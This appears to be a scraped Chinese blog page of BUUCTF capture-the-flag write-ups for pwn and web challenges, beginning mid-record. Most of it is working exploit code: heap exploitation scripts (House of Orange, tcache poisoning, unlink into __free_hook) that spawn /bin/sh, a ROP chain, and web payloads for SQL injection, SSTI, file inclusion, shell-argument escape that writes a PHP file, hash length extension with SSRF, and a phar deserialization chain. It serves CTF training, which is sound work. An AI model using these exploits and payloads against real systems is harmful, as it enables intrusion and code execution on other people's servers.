times&gt;} 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849def add(size): sla('choice :','1') sla(&quot;:&quot;,str(size)) sa(':','a'*8) sla(':','1') sla(':','1')def show(): sla('choice :','2')def edit(size,name): sla('choice :','3') sla(&quot;:&quot;,str(size)) sa(':',name) sla(':','1') sla(':','1')add(0x18)useless = flat(0,0x21,0x1f00000001,0)payload = 'a'*0x10 + useless + flat(0,0xfa1)edit(0x40,payload) # corrupt top chunkadd(0x1000) # old_top -&gt; unsortedadd(0x400) # slice old topshow()ru('a'*8)base = uu64(ru('\\n'))-1640-libc.sym['__malloc_hook']-0x10leak('base',base)system = base + libc.sym['system']io_list_all = base + libc.sym['_IO_list_all']'''large chunk:0x56512e53b0c0: 0x0000000000000000 0x00000000000004110x56512e53b0d0: 0x6161616161616161 0x00007f01ea9791880x56512e53b0e0: 0x000056512e53b0c0 0x000056512e53b0c0'''edit(0x10,'a'*0x10)show()ru('a'*0x10)heap = uu64(ru('\\n')) - 0xc0leak('heap',heap)# jump_table+0x18payload = flat(0,0,0,system).ljust(0x400,'\\x00')# _flags,size,fd,bk,write_base,write_ptr,padding,fake_vtablepayload += useless + flat('/bin/sh\\x00',0x61,0,io_list_all-0x10,2,3,'\\x00'*(0xd8-0x30),heap+0xd0)edit(0x1000,payload)sla('choice :','1') ciscn_2019_final_2本题需要将读入的flag的fd改为666。 存在tcache double free漏洞，首先分配多个short，利用double free泄露堆地址。然后tcache投毒，伪造chunk0大小，并释放进入unsorted bin泄露libc。注意释放前先填满tcache才能进入unsorted bin。 接下来继续投毒使int的fd指向fileno，再次double free泄露chunk0的mem指针地址。最后投毒指向chunk0的mem指针地址，再申请三次就可以修改fileno了。 12345678910111213141516171819202122232425262728293031323334353637383940414243add(1,0x30)free(1)add(2,0x20)add(2,0x20)add(2,0x20) # total size: 0x90add(2,0x20) # prevent mergingfree(2)add(1,0x30)free(2)show(2)ru('number :')chunk0 = int(ru('\\n'))-0xa0leak('chunk0',chunk0)add(2,chunk0) # poisoningadd(2,0xdeadbeef)add(2,0x91) # chunk0for i in range(7): # fill tcache free(1) add(2,0x20)free(1) # unsortedshow(1)ru('number :')base = int(ru('\\n'))-96-libc.sym['__malloc_hook']-0x10leak('base',base)fileno = base+libc.sym['_IO_2_1_stdin_']+0x70add(1,fileno) # poisoningadd(1,0x30)free(1)add(2,0x20)free(1)show(1)ru('number :')chunk0_mem = int(ru('\\n'))-0x30add(1,chunk0_mem) # poisoningadd(1,0xdeadbeef)add(1,0xdeadbeef)add(1,666)sla('&gt;',4) 强网杯_拟态_stkof采用了拟态防御，简单来说就是要用同一个脚本同时在32位和64位程序上getshell且两个程序的输出必须相同。 首先检查两个二进制文件，漏洞都是简单的栈溢出并且空间很大。区别在于可以溢出的长度相差8字节，这8字节应该就是能够用同一个脚本的关键所在。 容易想到利用常规ret2syscall，分别写出32位和64位脚本： 1234567891011121314151617pop_eax = 0x80a8af6pop_dcb = 0x806e9f1int_80 = 0x80495a3data = 0x80d7000chain86 = [ 'a'*(0x10c+4), elf.sym['read'], pop_dcb,0,data,0x100, pop_dcb,0,0,data, pop_eax,0xb, int_80]payload = flat(chain86)sa('?',payload)s('/bin/sh\\x00') 1234567891011121314151617181920pop_rax = 0x43b97cpop_rdi = 0x4005f6pop_rsi = 0x405895pop_rdx = 0x43b9d5syscall = 0x461645data = 0x6a4e40chain64 = [ 'a'*(0x110+8), pop_rax,0,pop_rdi,0, pop_rsi,data,pop_rdx,0x100, syscall, pop_rax,59,pop_rdi,data, pop_rsi,0,pop_rdx,0, syscall]payload = flat(chain64)sa('?',payload)s('/bin/sh\\x00') 那么怎么把两者合并呢？这就需要用到8字节的栈溢出长度差，在这8字节中，我们分别调整32位程序和64位程序的esp和rsp指针，使得经过调整后栈上的返回地址指向payload的不同部分。 这里需要注意的是，栈变量在32位下位于esp+0xc，在64位下位于rsp+0x0，在计算需要填充的padding时需要考虑到这一点。 12345678910111213141516171819202122232425262728293031323334353637383940414243pop_eax = 0x80a8af6pop_dcb = 0x806e9f1int_80 = 0x80495a3data86 = 0x80d7000read = 0x806c8e0add_esp_20 = 0x80a69f2offset86 = 0x20-0xc # esp+0xcchain86 = [ 'a'*offset86, read, pop_dcb,0,data86,0x8, pop_dcb,0,0,data86, pop_eax,0xb, int_80]payload86 = flat(chain86,word_size=32)pop_rax = 0x43b97cpop_rdi = 0x4005f6pop_rsi = 0x405895pop_rdx = 0x43b9d5syscall = 0x461645data64 = 0x6a4e40add_rsp_80 = 0x40cd17offset64 = 0x80-len(payload86) # rsp+0x0print hex(offset64)chain64 = [ 'a'*offset64, pop_rax,0,pop_rdi,0, pop_rsi,data64,pop_rdx,0x100, syscall, pop_rax,59,pop_rdi,data64, pop_rsi,0,pop_rdx,0, syscall]payload64 = flat(chain64,word_size=64)payload = 'a'*0x110 + (p32(add_esp_20)+'aaaa') + p64(add_rsp_80) + payload86 + payload64sa('?',payload)s('/bin/sh\\x00') axb_2019_heap利用格式化字符串漏洞泄露堆地址和libc。随后，可以发现edit时存在off by one，我们在构造unlink的fake chunk时，该漏洞会导致修改下一个chunk的prev_size后会覆盖掉它的size字段最后一个字节。但是同样的，我们也可以利用该漏洞手动恢复最后一个字节。，这里是0xa0。 接下来就常规unlink，覆盖free_hook为system，注意维持原note数组结构。 12345678910111213141516171819202122232425sla('name: ','%11$p.%15$p')ru(', ')heap = int(ru('.'),16)-0x1186base = int(ru('\\n'),16)-0x20830leak('heap',heap)leak('base',base)note = heap+0x202060system = base+libc.sym['system']free_hook = base+libc.sym['__free_hook']add(0,0x98)add(1,0x98)add(2,0x90)add(3,0x90,'/bin/sh\\x00')fd = note-0x18bk = note-0x10fake = flat(0,0x91,fd,bk).ljust(0x90,'\\x00') + p64(0x90)+'\\xa0'edit(0,fake)free(1)edit(0,flat(0,0,0,free_hook,0x98))edit(0,p64(system))free(3)","link":"/post/BUUPwn/"},{"title":"BUUCTF Web 练习","text":"偶然发现的 BUUCTF，真的非常好用了。 [HCTF 2018]WarmUpF12 发现source.php得源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can't see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can't see it&quot;; return false; } } if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; }?&gt; 发现存在hint.php： 1flag not here, and flag in ffffllllaaaagggg 结合上述代码，可以确定是利用文件包含读取ffffllllaaaagggg文件。为此，我们需要提供 GET 参数file。 注意到file参数的值会被经过如下处理： 12345$_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); 那么如果我们在中间插入一个?，就可以达到截断的效果。所以尝试?file=hint.php?ffffllllaaaagggg发现无法读取到内容，因此猜测hint.php?被当作了文件名的一部分，需要使用相对路径进行目录穿越：?file=hint.php?../../../../../ffffllllaaaagggg。 [强网杯 2019]随便注单引号可以发现存在注入，但尝试注入时页面返回 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 这说明无法通过常规手段进行注入，因此尝试堆叠注入： 121';show databases;1';show tables; 得到需要的表名1919810931114514，但是由于select等查询关键字被过滤，查字段内容需要另辟蹊径。这里使用了预处理语句： 11';sEt @poc=concat(char(115,101,108,101,99,116,32),'* from `1919810931114514`');prEpare poc from @poc;exEcute poc;# 注意这里可以使用char绕过、大小写绕过，并且纯数字表名需要用反引号包起来。 [护网杯 2018]easy_tornado我们需要计算的hash是md5(cookie_secret+md5(filename))，已经获得了flag的文件名，还需要cookie_secret。由于是tornado框架，可以尝试SSTI。 修改filehash进入错误页面/error?msg=Error，测试发现msg存在SSTI，使用msg={{handler.settings}}即可获得cookie_secret。最后计算MD5得payload： 1/file?filename=/fllllllllllllag&amp;filehash=a47f809c580850840a5562488d72a3df [SUCTF 2019]EasySQL源码泄露： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?php session_start(); include_once &quot;config.php&quot;; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass); if(!$MysqlLink){ die(&quot;Mysql Connect Error!&quot;); } $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB){ die(&quot;Choose Database Error!&quot;); } foreach ($_POST as $k=&gt;$v){ if(!empty($v)&amp;&amp;is_string($v)){ $post[$k] = trim(addslashes($v)); } } foreach ($_GET as $k=&gt;$v){ } } //die(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($post['query'])){ $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;; //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post['query'])); if(preg_match(&quot;/{$BlackList}/is&quot;,$post['query'])){ //echo $post['query']; die(&quot;Nonono.&quot;); } if(strlen($post['query'])&gt;40){ die(&quot;Too long.&quot;); } $sql = &quot;select &quot;.$post['query'].&quot;||flag from Flag&quot;; mysqli_multi_query($MysqlLink,$sql); do{ if($res = mysqli_store_result($MysqlLink)){ while($row = mysqli_fetch_row($res)){ print_r($row); } } }while(@mysqli_next_result($MysqlLink)); } ?&gt; 从sql语句可以看出存在堆叠注入，且flag被||拼接在了输入的后面。因此一种办法是把管道变成连接符，然后查询1||flag： 11; set sql_mode=pipes_as_concat;select 1 另一种办法是直接输入*,1，从而构造select *,1||flag from Flag，这里的||就是默认的或运算。 [HCTF 2018]admin注册时输入unicode字符会报错，由于开启了debug模式，直接可以拿到python的shell，从index.html中读flag。这个应该是BUU平台的非预期。 实际上，本题预期解是利用Unicode同形字，注册ᴀdmin并登陆，然后修改密码即可修改admin的密码，但是同样出现了很多非预期，具体参考出题人题解。 [RoarCTF 2019]Easy Calc首页可以发现js代码，也就是自定义的waf： 123456789101112131415$('#calc').submit(function(){ $.ajax({ url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()), type:'GET', success:function(data){ $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt; &lt;strong&gt;答案:&lt;/strong&gt;${data} &lt;/div&gt;`); }, error:function(){ alert(&quot;这啥?算不来!&quot;); } }) return false;}) 可以发现有calc.php，访问直接得到源码： 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET['num'])){ show_source(__FILE__);}else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '&quot;', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(&quot;what are you want to do?&quot;); } } eval('echo '.$str.';');}?&gt; 绕过php黑名单本身不难，但是waf中会先进行一次encodeURIComponent。这里用到的绕过waf技巧就是用 num参数而非num参数，这样做可以成功的原因在于php会尝试将传入的参数变为合法变量名，即strip掉首尾空格、加下划线等等，因此 num就会被处理成num，成功进入else逻辑，剩下的就是绕黑名单了： 1/calc.php?%20num=var_dump(scandir(chr(47))) 可以发现flag文件/f1agg，同样方法读出即可： 1/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) [强网杯 2019]高明的黑客提供了www.tar.gz，里面有3000+个php文件，都含有类似一句话的部分，但是大多不能用。需要写脚本找到能用的一句话木马： 12345678910111213141516171819202122232425262728293031import osimport reimport requestsfilenames = os.listdir('/var/www/html/src')pattern = re.compile(r&quot;\\$_[GEPOST]{3,4}\\[.*\\]&quot;)for name in filenames: print(name) with open('/var/www/html/src/'+name,'r') as f: data = f.read() result = list(set(pattern.findall(data))) for ret in result: try: command = 'uname' flag = 'Linux' if 'GET' in ret: passwd = re.findall(r&quot;'(.*)'&quot;,ret)[0] r = requests.get(url='http://localhost/' + name + '?' + passwd + '='+ command) if flag in r.text: print('GET /{}?{}=cat /flag'.format(name,passwd)) break elif 'POST' in ret: passwd = re.findall(r&quot;'(.*)'&quot;,ret)[0] r = requests.post(url='http://localhost/' + name,data={passwd:command}) if flag in r.text: print('POST /{}?{}=cat /flag'.format(name,passwd)) break except: pass [SUCTF 2019]CheckIn可以上传文件，但是会对后缀名、文件头进行检查，同时文件中不能存在&lt;?。后者用&lt;script language=&quot;php&quot;&gt;就可以绕过，前者可以上传图片马。随后就需要我们去包含这个图片马。 可以看到上传的文件目录是固定的，同目录下原本就存在index.php。那么可以尝试上传.user.ini，令index.php中包含上传的图片马。 如下编写.user.ini： 12GIF89aauto_prepend_file=1.jpg 这样以后，再访问上传目录下的index.php即可。 [网鼎杯 2018]Fakebook首先通过robots.txt发现user.php.bak： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo{ public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-&gt;get($this-&gt;blog); } public function isValidBlog () { $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); }} 可以发现输入的blog处存在SSRF，并且对blog字符串的模式做了限制。 先随便注册一个账号，查看账号信息会访问到view.php?no=1，这里存在SQL注入。 12345no=1 and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),1)--no=1 and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users'),'~'),1)--no=1 and updatexml(1,concat('~',(select data from users),'~'),1)-- 可以发现存在no,username,passwd,data这些字段，并且data字段存放了序列化的User对象。 那么我们可以构造一个User使得他的blog指向flag文件。这样就可以绕过user.php的检查。 构造序列化对象： 12$a = new UserInfo('merc','10','file:///var/www/html/flag.php');echo serialize($a); 另外union select被过滤，需要注释绕过。 1no=-1'union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;merc&quot;;s:3:&quot;age&quot;;i:10;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}'-- [De1CTF 2019]SSRF Meiec 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500 result['msg'] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot;def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0') 两种操作：scan写入result.txt，read读文件。生成签名时将secret_key放在最前面，因此可以通过哈希长度扩展攻击在末尾添加一个read操作。这样就可以先把flag.txt写入result.txt再读出来。 为了读到flag.txt，很容易想到file协议，但是在waf中过滤了file和gopher协议。这里可以利用urllib库中的特殊协议local-file来读文件，造成SSRF。 1234567891011121314151617import requestsimport urllibimport hashpumpybase = 'http://0230c9c3-8270-4e74-9786-e6ab55d01eeb.node3.buuoj.cn/'url = 'local-file:flag.txt'r = requests.get(base + 'geneSign?param=' + url)print(r.text)hashcode = hashpumpy.hashpump(r.text, url+'scan', 'read', 16)print(hashcode)cookies = { 'sign': hashcode[0], 'action': urllib.parse.quote(hashcode[1][len(url):])}r = requests.get(base + 'De1ta?param='+url, cookies=cookies)print(r.text) [RoarCTF 2019]Easy Java容易发现任意文件下载漏洞，我们可以下载WEB-INF/web.xml，注意必须通过POST方式。可以发现存在FlagController，然后去下载FlagController： 1filename=WEB-INF/classes/com/wm/ctf/FlagController.class jd-gui反编译可以发现flag的base64编码。 [0CTF 2016]piapiapia扫目录得www.zip，发现正常注册登陆后可以修改档案，随后查看档案时存在反序列化操作，而其中图片是通过file_get_contents获取的，可以用来读关键文件config.php。 1234$profile['phone'] = $_POST['phone'];$profile['email'] = $_POST['email'];$profile['nickname'] = $_POST['nickname'];$profile['photo'] = 'upload/' . md5($file['name']); 12345$profile = unserialize($profile);$phone = $profile['phone'];$email = $profile['email'];$nickname = $profile['nickname'];$photo = base64_encode(file_get_contents($profile['photo'])); 但是在更新档案时，photo字段前会拼接一个upload/导致无法读到config.php。那么我们可以考虑向nickname注入序列化字符串的末尾部分，使得反序列化时忽略掉原本的photo字段。 但是对于nickname又存在过滤： 12if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); 不过绕过很简单，数组绕过即可。 最后，为了注入photo，我们需要额外添加： 1&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php 共31个字符，因此我们必须让nickname在被序列化之前，长度增加31，否则我们新增的部分就不会被读入。幸运的是，我们有filter函数： 123456789public function filter($string) { $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string);} 可以发现它会将where替换为hacker，使得字符串长度+1，那么我们重复该过程31次即可。 最终payload： 123456789101112131415161718------WebKitFormBoundary8V1KsQLRGLqfB6AnContent-Disposition: form-data; name=&quot;phone&quot;12345678901------WebKitFormBoundary8V1KsQLRGLqfB6AnContent-Disposition: form-data; name=&quot;email&quot;admin@admin.com------WebKitFormBoundary8V1KsQLRGLqfB6AnContent-Disposition: form-data; name=&quot;nickname[]&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php------WebKitFormBoundary8V1KsQLRGLqfB6AnContent-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;1.png&quot;Content-Type: image/pngconfig.php------WebKitFormBoundary8V1KsQLRGLqfB6An-- [BUUCTF 2018]Online Tool参考文章。 简单来说，escapeshellarg会对传入参数中的单引号进行转义，然后将单引号两边的内容用''包起来；而escapeshellcmd会对转义符\\以及不成对的单引号进行转义。那么先escapeshellarg再escapeshellcmd就会造成单引号逃逸。 payload： 1?host=' &lt;?php echo phpinfo();?&gt; -oG 1.php ' 经过escapeshellarg： 1?host=''\\' '&lt;?php echo phpinfo();?&gt; -oG 1.php' \\''' 经过escapeshellcmd： 1?host=''\\\\' '\\&lt;\\?php echo phpinfo\\(\\)\\;\\?\\&gt; -oG 1.php' \\\\''' 然后访问沙箱即可。 [SUCTF 2019]Pythonginx123456789101112131415161718192021@app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == 'suctf.cc': return &quot;我扌 your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl, timeout=2).read() else: return &quot;我扌 your problem? 333&quot; 题目不允许主机名为suctf.cc，但是给了提示h.encode('idna'.decode('utf-8))，可以查到urllib相关漏洞，利用idna字符℆即可绕过主机名过滤，使得最终解码得到主机名是suctf.cc。 然后，题目还提示了nginx，因此可以想到用file协议读取nginx配置文件，得到flag位置，恰好也位于/usr目录下，因此直接读即可。 [CISCN2019 华北赛区 Day1 Web1]Dropbox参考 注册后随便上传个文件，然后下载，抓包发现可以改成别的文件，例如/var/www/html/index.php： 1234567&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION['sandbox']);$a-&gt;Name();$a-&gt;Size();?&gt; 这里创建了FileList对象，调用了两个方法。 然后下载class.php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User { public $db; public function __construct() { global $db; $this-&gt;db = $db; } public function user_exist($username) { $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-&gt;db-&gt;close(); }}class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); } } public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = '&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) { $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;' . htmlentities($func) . '&lt;/th&gt;'; } $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) { $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) { $table .= '&lt;td class=&quot;text-center&quot;&gt;' . htmlentities($value) . '&lt;/td&gt;'; } $table .= '&lt;td class=&quot;text-center&quot; filename=&quot;' . htmlentities($filename) . '&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;涓嬭浇&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; } echo $table; }}class File { public $filename; public function open($filename) { $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-&gt;filename); } public function size() { $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-&gt;filename); } public function close() { return file_get_contents($this-&gt;filename); }}?&gt; 我们注意到，FileList并没有刚才调用的两个方法，但是却有__call魔术方法，因此会去调用File的name和size方法。这里提示我们使用__call调用File的其他方法来进行漏洞利用，例如close就是不错的选择。 而在下载和删除时，会分别使用download.php和delete.php，这两个文件也下载下来： 12345678910111213141516171819202122232425&lt;?phpsession_start();if (!isset($_SESSION['login'])) { header(&quot;Location: login.php&quot;); die();}if (!isset($_POST['filename'])) { die();}include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) { Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename)); echo $file-&gt;close();} else { echo &quot;File not exist&quot;;}?&gt; 123456789101112131415161718192021222324252627&lt;?phpsession_start();if (!isset($_SESSION['login'])) { header(&quot;Location: login.php&quot;); die();}if (!isset($_POST['filename'])) { die();}include &quot;class.php&quot;;chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) { $file-&gt;detele(); Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); echo json_encode($response);} else { Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;); echo json_encode($response);}?&gt; 可以看到我们不能通过任意文件下载去下载flag文件。而在删除时，关键在于调用了detele函数，这会触发unlink。unlink在用phar://伪协议解析文件时会进行反序列化，结合刚才的魔术方法__call，我们容易想到利用phar反序列化来读flag。 我们已经有FileList-&gt;__destruct方法打印__call的结果。接下来，读flag显然只能用File的close方法，为了调用这个方法，我们需要构造形如FileList-&gt;__call(&quot;close&quot;)的调用。 搜索字符串close，可以发现代码中还有一处close调用，位于User-&gt;__destruct中，本来是用于关闭数据库连接，但我们可以设置db为FileList对象从而达到目的。最后设置File对象的filename为/flag.txt。 由于我们使用了unlink，所以会自动调用User-&gt;__destruct，至此pop链构造完成。 123456789101112131415161718192021222324252627282930&lt;?phpclass User{ public $db;}class FileList{ private $files; public function __construct() { $this-&gt;files = array(new File()); }}class File{ public $filename = &quot;/flag.txt&quot;;}$fl = new FileList();$u = new User();$u-&gt;db = $fl;$phar = new Phar(&quot;1.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;addFromString(&quot;1.txt&quot;, &quot;text&quot;);$phar-&gt;setMetadata($u);$phar-&gt;stopBuffering();?&gt; 